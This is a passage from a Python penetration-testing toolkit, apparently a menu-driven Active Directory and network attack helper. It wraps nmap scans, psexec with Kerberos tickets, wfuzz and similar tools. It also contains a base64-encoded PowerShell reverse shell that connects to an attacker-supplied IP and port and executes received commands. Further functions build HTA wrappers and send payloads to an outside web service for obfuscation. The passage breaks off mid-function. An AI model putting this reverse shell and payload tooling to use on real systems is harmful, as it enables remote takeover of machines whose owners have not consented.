#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#         PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import time
import getopt
import base64
import string
import random
import socket
import hashlib
import os.path
import sqlite3
import binascii
import pyfiglet
import datetime
import requests
import linecache

from termcolor import colored
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Load additional netWork, xParameter
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if len(sys.argv) < 2:
   netWork = "tun0"
else:
   netWork = sys.argv[1]
   
if len(sys.argv) > 2:
   xParameter = sys.argv[2]
else:
   xParameter = ""

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : TREADSTONE                                                             
# Details : Create functional subroutines called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def cutLine(variable1, variable2):
   runCommand("sed -i '/" + variable1 + "/d' ./" + variable2)
   return
   
def parsFile(variable):
   runCommand("sed -i '/^$/d' ./" + variable)
   return

def test_DNS():
   if DNS[:5] == "EMPTY":
      print("[-] DNS has not been specified...")
      return 1
   else:
      return 0

def test_TIP():
   if TIP[:5] == "EMPTY":
      print("[-] REMOTE IP has not been specified...")
      return 1
   else:
      return 0
      
def test_WEB():
   if WEB[:5] == "EMPTY":
      print("[-] Website url has not been specified...")
      return 1
   else:
      return 0
   
def test_DOM():
   if DOM[:5] == "EMPTY":
      print("[-] DOMAIN name has not been specified...")
      return 1
   else:
      return 0  
   
def test_USR():
   if USR == "":
      print("[-] USERNAME has not been specified...")
      return 1
   else:
      return 0
      
def test_PAS():
   if PAS == "":
      print("[-] PASSWORD has not been specified...")
      return 1
   else:
      return 0
      
def test_SID():
   if SID[:5] == "EMPTY":
      print("[-] Domain SID has not been specified...")
      return 1
   else:
      return 0
   
def test_PRT(variable):
   if variable not in PTS:
      print("[-] Port " + orginal + " not found in live ports...")
      return 1
   else:
      return 0

def test_TSH():
   if TSH[:5] == "EMPTY":
      print("[-] SHARE NAME has not been specified...")
      return 1
   else:
      return 0
      
def lineCount(variable):
   runCommand("cat " + variable + " | wc -l > count1.tmp")
   count = (linecache.getline("count1.tmp", 1).rstrip("\n"))
   if count == 0:
      return int(count)
   else:
      runCommand("grep --regexp='$' --count " + variable + " > count2.tmp")
      count = (linecache.getline("count2.tmp", 1).rstrip("\n"))
   return int(count)

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable

def dotPadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      variable += "."
   return variable

def getTime():
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = spacePadding(variable, COL1)
   return variable   
   
def getPort():
   port = input("[?] Please enter the listening port number: ")
   if port.isdigit():
      return port
   else:
      print("[-] Sorry, I do not understand the value " + port + "...")
      return 1

def runCommand(variable):
   if proxyChains == 1:
      print("[i] Proxychains enabled...")
      variable = "proxychains4 " + variable
   if xParameter == "bughunt":
      print(colored("[i] Running command: " + variable, colour5))
   if xParameter == "commandOnly":
      print(colored("[i] Running command: " + variable, colour5))
      return
   os.system(variable)   
   return
 
def prompt():
   null = input("\nPress ENTER to continue...")
   return
   
def wipeTokens(VALD):
   runCommand("rm    " + dataDir + "/tokens.txt")
   runCommand("touch " + dataDir + "/tokens.txt") 
   for x in range(0, maxUser):
      VALD[x] = "0"
   return
   
def nmapTrim(variable):
   cutLine("# Nmap", variable)
   cutLine("Nmap scan report", variable)
   cutLine("Host is up, received", variable)
   cutLine("STATE SERVICE", variable)
   cutLine("Nmap done", variable)
   runCommand("awk '/Service Info/' " + variable + " > service.tmp")
   cutLine("Service Info", variable)
   cutLine("Service detection performed", variable)   
   return
   
def saveParams():
   runCommand("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")   
   runCommand("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + WEB + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + USR + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + PAS + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + NTM + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + TGT + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")   
   runCommand("echo '" + DOM + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")
   runCommand("echo '" + FIL + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")   
   runCommand("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp"); runCommand("echo '\n' >> base64.tmp")    
   parsFile("base64.tmp")    
   OSF2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
   COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
   DNS2 = linecache.getline("base64.tmp", 3).rstrip("\n")
   TIP2 = linecache.getline("base64.tmp", 4).rstrip("\n")
   PTS2 = linecache.getline("base64.tmp", 5).rstrip("\n")
   WEB2 = linecache.getline("base64.tmp", 6).rstrip("\n")
   USR2 = linecache.getline("base64.tmp", 7).rstrip("\n")
   PAS2 = linecache.getline("base64.tmp", 8).rstrip("\n")
   NTM2 = linecache.getline("base64.tmp", 9).rstrip("\n")
   TGT2 = linecache.getline("base64.tmp", 10).rstrip("\n")
   DOM2 = linecache.getline("base64.tmp", 11).rstrip("\n")
   SID2 = linecache.getline("base64.tmp", 12).rstrip("\n")
   FIL2 = linecache.getline("base64.tmp", 13).rstrip("\n")
   TSH2 = linecache.getline("base64.tmp", 14).rstrip("\n")   
   cursor.execute("UPDATE REMOTETARGET SET OSF = \"" + OSF2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + DNS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + TIP2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PTS = \"" + PTS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET WEB = \"" + WEB2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET USR = \"" + USR2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET PAS = \"" + PAS2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET NTM = \"" + NTM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TGT = \"" + TGT2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DOM = \"" + DOM2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET SID = \"" + SID2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET FIL = \"" + FIL2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET TSH = \"" + TSH2 + "\" WHERE IDS = 1"); connection.commit()   
   return
     
def privCheck():
   runCommand("ls  | grep ccache > ticket.tmp")   
   count = lineCount("ticket.tmp")   
   if count > 1:
      print("[i] More than one ticket was found...")            
   for x in range(1, count):
      ticket = linecache.getline("ticket.tmp", x).rstrip("\n")
      ticket = ticket.rstrip(" ")
      if ticket != "":
         runCommand("export KRB5CCNAME=" + ticket)
         print(colored("[*] Checking ticket status for " + ticket + "...", colour3))
         runCommand(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
      else:
         print("[-] Unable to find a valid ticket...")
      return spacePadding(ticket, COL1)
         
def checkPorts(PTS, POR):
   checkParams = test_TIP()
   if checkParams != 1:
      print(colored("[*] Attempting to enumerate all open tcp ports, please wait as this can take a long time...", colour3))      
      
      print("[+] Checking well known ports range 0 to 1023...")
      runCommand("nmap " + IP46 + " -p 0-1023 --min-rate=1000 -T4 " + TIP.rstrip(" ") + " > open.tmp")
      runCommand("cat open.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > openports1.tmp")
      showPorts("openports1.tmp")      
      
      print("[+] Checking registered ports range 1024 to 49151...")
      runCommand("nmap " + IP46 + " -p 1024-49151 --min-rate=1000 -T4 " + TIP.rstrip(" ") + " > open.tmp")
      runCommand("cat open.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > openports2.tmp")
      showPorts("openports2.tmp")      
      
      print("[+] Checking dynamic private ports range 49152 to 65535...")
      runCommand("nmap " + IP46 + " -p 49152-65535 --min-rate=1000 -T4 " + TIP.rstrip(" ") + " > open.tmp")
      runCommand("cat open.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > openports3.tmp")
      showPorts("openports3.tmp")            
      
      print(colored("[*] Attempting to enumerate top 200 udp ports, please wait as this can take a long time...", colour3)) 
      runCommand("nmap " + IP46 + " -sU --min-rate=1000 -T4 --top-ports 200 " + TIP.rstrip(" ") + " > open.tmp")           
      runCommand("cat open.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$// > openports4.tmp")
      showPorts("openports4.tmp")
      
      PTS = ""
      PTS1 = linecache.getline("openports1.tmp", 1).rstrip("\n")
      if PTS1 != "":
         PTS = PTS1
      PTS2 = linecache.getline("openports2.tmp", 1).rstrip("\n")
      if PTS2 != "":
         if PTS != "":
            PTS = PTS +","
         PTS = PTS + PTS2
      PTS3 = linecache.getline("openports3.tmp", 1).rstrip("\n")
      if PTS3 != "":
         if PTS != "":
            PTS = PTS + ","
         PTS = PTS + PTS3
      PTS4 = linecache.getline("openports4.tmp", 1).rstrip("\n")
      if PTS4 != "":
         if PTS != "":
            PTS = PTS + ","
         PTS = PTS + PTS4
     
      runCommand ("echo " + PTS + " > sorted.tmp")
      runCommand("tr , '\n' < sorted.tmp | sort -nu | paste -sd, - > uniq.tmp")
      PTS = linecache.getline("uniq.tmp", 1).rstrip("\n")      
      
      
      if PTS[:1] == "":
         print("[-] Unable to enumerate any port information, good luck!!...")
         PTS = "EMPTY"
      else:
         print("[+] Total found live ports...\n")
         print((colored(PTS,colour6) + "\n"))
   return PTS
   
def showPorts(variable):
   check = linecache.getline(variable, 1).rstrip("\n")
   if check[:1] == "":
      print("[-] No ports found..")
   else:
      print("[+] Found live ports...\n")
      print(colored(check,colour6) + "\n")        
   return


def checkIke():
   print(colored("[*] Attempting to undertake an IKE test...", colour3))
   checkParams=test_PRT("500")
   if checkParams == 1:
      return
   else:
      runCommand("ike-scan -M " + TIP.rstrip(" ") + " > ike.tmp")
      catsFile("ike.tmp")
   return

def squidCheck():
   print(colored("[*] Attempting to enumerate squid proxy for hidden ports...", colour3))
   checkParams = test_PRT("3128")   
   if checkParams == 1:
      return
   else:
      if proxyChains == 0:
         runCommand("wfuzz -t32 -z range,1-65535 -p '" + TIP.rstrip(" ") + ":3128' --hc 503 http://localhost:FUZZ/ > squid.tmp  2>&1")
         catsFile("squid.tmp | grep '\"'")
      else:
         print("[-] Unable to enumerate hidden ports, proxychains enabled...")
   return
   
def checkInterface(variable, COM):
   print(colored("[*] Checking network interface...", colour3))  
   try:      
      authLevel = RPC_C_AUTHN_LEVEL_NONE      
      if variable == "DNS":
         stringBinding = r'ncacn_ip_tcp:%s' % DNS.rstrip(" ")
      if variable == "TIP":
         stringBinding = r'ncacn_ip_tcp:%s' % TIP.rstrip(" ")                  
      rpctransport = transport.DCERPCTransportFactory(stringBinding)
      portmap = rpctransport.get_dce_rpc()
      portmap.set_auth_level(authLevel)
      portmap.connect()
      objExporter = IObjectExporter(portmap)
      bindings = objExporter.ServerAlive2()      
      checkParams = 0            
      for binding in bindings:
         NetworkAddr = binding['aNetworkAddr']                  
         if checkParams == 0:
            if "." not in NetworkAddr:
               print("[+] Found network interface...\n")
               COM = NetworkAddr
               COM = COM.replace(chr(0), '')
               checkParams = 1               
         print(colored("Address: " + NetworkAddr, colour6))  
      print("")                
   except:
      print("[-] No responce from network interface, checking remote host instead...")
      COM = spacePadding("UNKNOWN", COL0)      
      if variable == "DNS":
           runCommand("ping -c 5 " + DNS.rstrip(" ") + " > ping.tmp")
      if variable == "TIP":
           runCommand("ping -c 5 " + TIP.rstrip(" ") + " > ping.tmp")           
      cutLine("PING","ping.tmp")
      cutLine("statistics","ping.tmp")
      parsFile("ping.tmp")
      runCommand("sed -i '$d' ./ping.tmp")      
      count = lineCount("ping.tmp")
      nullTest = linecache.getline("ping.tmp", count).rstrip("\n")
      runCommand("sed -i '$d' ./ping.tmp")
      catsFile("ping.tmp") 
      if nullTest != "":
         print ("[+] " + nullTest + "...")
      else:
         print("[-] No responce from host...")
   COM = spacePadding(COM, COL0)
   return COM       
   
def checkBIOS():
   if IP46 == "-6":
      return
   else:
      print(colored("[*] Checking windows network neighborhood protocol...", colour3))
      runCommand("nbtscan -rv " + TIP.rstrip(" ") + " > bios.tmp")
      runCommand("sed -i '/Doing NBT name scan for addresses from/d' ./bios.tmp")
      runCommand("sed -i '/^$/d' ./bios.tmp")
      nullTest = linecache.getline("bios.tmp", 1).rstrip("\n")
      if nullTest == "":
         print("[-] No netbios information found...")
      else:
         print("[+] Found protocol...")
         catsFile("bios.tmp")
   return
   
def checkWAF():
      print(colored("[*] Checking to see if a Web Application Firewall (WAF) has been installed...", colour3))
      runCommand("wafw00f -a https://" + TIP.rstrip(" ") + " -o waf.tmp > tmp.tmp 2>&1")
      waf = linecache.getline("waf.tmp", 1).rstrip("\n")
      if waf != "":
         print(colored("\n" + waf.lstrip(" "), colour6))
      else:
         print("[-] Site " + TIP.rstrip(" ") + " appears to be down...")
      return
   
def networkSweep():
   if IP46 == "-6":
      return
   else:
      bit1, bit2, bit3, bit4 = TIP.split(".")
      print(colored("[*] Attempting to enumerate all hosts on this network range, please wait...", colour3))
      runCommand("nmap -v -sn " + bit1 + "." + bit2 + "." + bit3 + ".1-254 -oG pingsweep.tmp > temp.tmp 2>&1")
      runCommand('grep Up pingsweep.tmp | cut -d " " -f 2 > hosts.tmp')
      nullTest = linecache.getline("hosts.tmp", 1).rstrip("\n")
      if nullTest == "":
         print("[-] No live hosts found...")
      else:
         print("[+] Found live hosts...")         
         the_list = []
         runCommand("echo '" + Green + "'")         
         with open("hosts.tmp") as file:
            for line in file:
               line = line.rstrip("\n")
               the_list.append(line.rstrip(" "))
            num_columns = 8
            while len(the_list) % num_columns != 0:
               the_list.append("255.255.255.255")
            for count,item in enumerate(sorted(the_list), 1):
               if item != "255.255.255.255":
                  print(item.ljust(18), end =' ')
               if count % num_columns == 0:
                  print("")        
   runCommand("echo '" + Reset + "'")
   return      
   
def catsFile(variable):
   count = lineCount(variable)
   if count > 0:
      runCommand("echo '" + Green + "'")
      runCommand("cat " + variable)
      runCommand("echo '" + Reset + "'")
   return   
   
def ServerSync(localTime):
   print(colored("[*] Attempting to synchronise time with remote server...", colour3))
   checkParams = test_PRT("88")   
   if checkParams == 1:
      return
   else:
      runCommand("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")
      dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
      if dateTime != "":
         print("[+] Synchronised with remote server...")
         date, time = dateTime.split(" ")
         time = time.rstrip(")")
         runCommand("echo '" + Green + "'")
         runCommand("timedatectl set-time " + date)
         runCommand("date --set=" + time)
         runCommand("echo '" + Reset + "'")
         LTM = time
         localTime = 1
      else:
         print("[-] Server synchronisation did not occur...")
   return localTime                     

def registryKeys():
   print("\tHKEY_CLASSES_ROOT   HKCR")
   print("\tHKEY_CURRENT_USER   HKCU")
   print("\tHKEY_LOCAL_MACHINE  HKLM")
   print("\tHKEY_USERS          HKU ")
   print("\tHKEY_CURRENT_CONFIG HKCC")
   return
   
def idGenerator(size=6, chars=string.ascii_uppercase + string.digits):
   return ''.join(random.choice(chars) for _ in range(size))
   
def body(content):
   body = f"""<html>
   <head>
   <HTA:APPLICATION id="{idGenerator()}"
   applicationName="{idGenerator()}"
   border="thin"
   borderStyle="normal"
   caption="yes"
   icon="http://127.0.0.1/{idGenerator()}.ico"
   maximizeButton="yes"
   minimizeButton="yes"
   showInTaskbar="no"
   windowState="normal"
   innerBorder="yes"
   navigable="yes"
   scroll="auto"
   scrollFlat="yes"
   singleInstance="yes"
   sysMenu="yes"
   contextMenu="yes"
   selection="yes"
   version="1.0" />
   <script>
   {content}
   </script>
   <title>{idGenerator()}</title>
   </head>
   <body>
   <h1>{idGenerator()}</h1>
   <hr>
   </body>
   </html>"""
   return body   
   
def encrypt(payload):
   # https://github.com/felamos/weirdhta
   api_url = "https://enigmatic-shore-46592.herokuapp.com/api/weirdhta"
   data = r"""{"code" : "%s"}""" % (payload.decode())
   header = {"Content-Type": "application/json"}
   r = requests.post(api_url, headers=header, data=data)
   return r.text
   
def powershell(ip, port):
   # https://forums.hak5.org/topic/39754-reverse-tcp-shell-using-ms-powershell-only/
   revB64 = "IHdoaWxlICgxIC1lcSAxKQp7CiAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ0NvbnRpbnVlJzsKICAgIHRyeQogICAgewogICAgICAgICRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoIlNVUEVSSVBBIiwgUE9SVCk7CiAgICAgICAgJHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7CiAgICAgICAgW2J5dGVbXV0kYnl0ZXMgPSAwLi4yNTV8JXswfTsKICAgICAgICAkc2VuZGJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCJDbGllbnQgQ29ubmVjdGVkLi4uIisiYG5gbiIgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKTsKICAgICAgICAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZXMsMCwkc2VuZGJ5dGVzLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpOwogICAgICAgIHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkKICAgICAgICB7CiAgICAgICAgICAgICRyZWNkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOwogICAgICAgICAgICBpZigkcmVjZGF0YS5TdGFydHNXaXRoKCJraWxsLWxpbmsiKSl7IGNsczsgJGNsaWVudC5DbG9zZSgpOyBleGl0O30KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNhdHRlbXB0IHRvIGV4ZWN1dGUgdGhlIHJlY2VpdmVkIGNvbW1hbmQKICAgICAgICAgICAgICAgICRzZW5kYmFjayA9IChpZXggJHJlY2RhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTsKICAgICAgICAgICAgICAgICRzZW5kYmFjazIgID0gJHNlbmRiYWNrICsgIlBTICIgKyAocHdkKS5QYXRoICsgIj4gIjsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICRlcnJvclswXS5JbnZvY2F0aW9uSW5mby5Qb3NpdGlvbk1lc3NhZ2U7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2syICA9ICAiRVJST1I6ICIgKyAkZXJyb3JbMF0uVG9TdHJpbmcoKSArICJgbmBuIiArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7CiAgICAgICAgICAgICAgICBjbHM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJHJldHVybmJ5dGVzID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOwogICAgICAgICAgICAkc3RyZWFtLldyaXRlKCRyZXR1cm5ieXRlcywwLCRyZXR1cm5ieXRlcy5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKTsgICAgICAgICAgCiAgICAgICAgfQogICAgfQogICAgY2F0Y2ggCiAgICB7CiAgICAgICAgaWYoJGNsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICAkY2xpZW50LkNsb3NlKCk7CiAgICAgICAgfQogICAgICAgIGNsczsKICAgICAgICBTdGFydC1TbGVlcCAtcyAzMDsKICAgIH0gICAgIAp9IAo="
   revPlain = base64.b64decode(revB64).decode()
   rev = revPlain.replace("SUPERIPA" , ip).replace("PORT", port)
   payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
   return payload
      
def dispBanner(variable,flash):
   ascii_banner = pyfiglet.figlet_format(variable).upper()
   ascii_banner = ascii_banner.rstrip("\n")
   if flash == 1:
      runCommand("clear")
      print(colored(ascii_banner,colour0, attrs=['bold']))
   runCommand("pyfiglet " + variable + " > banner.tmp")
   return
   
def dispSubMenu(variable):
   variable = spacePadding(variable,163)
   runCommand("clear")
   dispMenu()
   options()
   print('\u2554' + ('\u2550')*163 + '\u2557')
   print('\u2551' + variable + '\u2551')
   print('\u255A' + ('\u2550')*163 + '\u255D')
   return
   
def clearClutter():
   runCommand("rm *.tmp")
   linecache.clearcache()
   return

def dispMenu():
   print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
   print('\u2551' + " TIME ", end =' ')   
   if localTime == 0:
      print(colored(LTM[:6],colour7), end=' ')
   else:
      print(colored(LTM[:6],colour6), end=' ')      
   print('\u2551' + " " + colored("REMOTE COMPUTER NAME",colour5), end=' ')   
   if COM[:7] == "UNKNOWN":
      print(colored(COM.upper(),colour7), end=' ')
   else:
      print(colored(COM.upper(),colour6), end=' ')      
   print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')   
   print('\u2551' + " O/S  FORMAT  " + '\u2551', end=' ')
   if OSF[:5] == "EMPTY":
      print(colored(OSF[:COL1],colour7), end=' ')
   else:
      print(colored(OSF[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[0]:
      print(colored(SHAR[0],colour3), end=' ')
   else:
      print(colored(SHAR[0],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[0] == "1":
      print(colored(USER[0],colour2), end=' ')
      print(colored(HASH[0],colour2), end=' ')
   else:
      print(colored(USER[0],colour6), end=' ')
      print(colored(HASH[0],colour6), end=' ')   
   print('\u2551')      
   print('\u2551' + " DNS ADDRESS  " + '\u2551', end=' ')
   if DNS[:5] == "EMPTY":
      print(colored(DNS[:COL1],colour7), end=' ')
   else:
      print(colored(DNS[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[1]:
      print(colored(SHAR[1],colour3), end=' ')
   else:
      print(colored(SHAR[1],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[1] == "1":
      print(colored(USER[1],colour2), end=' ')
      print(colored(HASH[1],colour2), end=' ')
   else:
      print(colored(USER[1],colour6), end=' ')
      print(colored(HASH[1],colour6), end=' ')   
   print('\u2551')   
   print('\u2551' + " IP  ADDRESS  " + '\u2551', end=' ')
   if TIP[:5] == "EMPTY":
      print(colored(TIP[:COL1],colour7), end=' ')
   else:
      print(colored(TIP[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[2]:
      print(colored(SHAR[2],colour3), end=' ')
   else:
      print(colored(SHAR[2],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[2] == "1":
      print(colored(USER[2],colour2), end=' ')
      print(colored(HASH[2],colour2), end=' ')
   else:
      print(colored(USER[2],colour6), end=' ')
      print(colored(HASH[2],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " LIVE  PORTS  " + '\u2551', end=' ')
   if POR[:5] == "EMPTY":
      print(colored(POR[:COL1],colour7), end=' ')
   else:
      print(colored(POR[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[3]:
      print(colored(SHAR[3],colour3), end=' ')
   else:
      print(colored(SHAR[3],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[3] == "1":
      print(colored(USER[3],colour2), end=' ')
      print(colored(HASH[3],colour2), end=' ')
   else:
      print(colored(USER[3],colour6), end=' ')
      print(colored(HASH[3],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " WEBSITE URL  " + '\u2551', end=' ')
   if WEB[:5] == "EMPTY":
      print(colored(WEB[:COL1],colour7), end=' ')
   else:
      print(colored(WEB[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[4]:
      print(colored(SHAR[4],colour3), end=' ')
   else:
      print(colored(SHAR[4],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[4] == "1":
      print(colored(USER[4],colour2), end=' ')
      print(colored(HASH[4],colour2), end=' ')
   else:
      print(colored(USER[4],colour6), end=' ')
      print(colored(HASH[4],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " USER   NAME  " + '\u2551', end=' ')
   if USR[:2] == "''":
      print(colored(USR[:COL1],colour7), end=' ')
   else:
      print(colored(USR[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[5]:
      print(colored(SHAR[5],colour3), end=' ')
   else:
      print(colored(SHAR[5],colour6), end=' ')   
   print('\u2551', end=' ')
   if VALD[5] == "1":
      print(colored(USER[5],colour2), end=' ')
      print(colored(HASH[5],colour2), end=' ')
   else:
      print(colored(USER[5],colour6), end=' ')
      print(colored(HASH[5],colour6), end=' ')   
   print('\u2551')   
   print('\u2551' + " PASS   WORD  " + '\u2551', end=' ')
   if PAS[:2] == "''":
      print(colored(PAS[:COL1],colour7), end=' ')
   else:
      print(colored(PAS[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[6]:
      print(colored(SHAR[6],colour3), end=' ')
   else:
      print(colored(SHAR[6],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[6] == "1":
      print(colored(USER[6],colour2), end=' ')
      print(colored(HASH[6],colour2), end=' ')
   else: 
      print(colored(USER[6],colour6), end=' ')
      print(colored(HASH[6],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " NTLM   HASH  " + '\u2551', end=' ')
   if NTM[:5] == "EMPTY":
      print(colored(NTM[:COL1],colour7), end=' ')
   else:
      print(colored(NTM[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[7]:
      print(colored(SHAR[7],colour3), end=' ')
   else:
      print(colored(SHAR[7],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[7] == "1":
      print(colored(USER[7],colour2), end=' ')
      print(colored(HASH[7],colour2), end=' ')
   else:
      print(colored(USER[7],colour6), end=' ')
      print(colored(HASH[7],colour6), end=' ')         
   print('\u2551')   
   print('\u2551' + " TICKET NAME  " + '\u2551', end=' ')
   if TGT[:5] == "EMPTY":
      print(colored(TGT[:COL1],colour7), end=' ')
   else:
      print(colored(TGT[:COL1],colour6), end=' ')
   print('\u2551', end=' ')   
   if TSH.rstrip(" ") in SHAR[8]:
      print(colored(SHAR[8],colour3), end=' ')
   else:
      print(colored(SHAR[8],colour6), end=' ')   
   print('\u2551', end=' ')   
   if VALD[8] == "1":
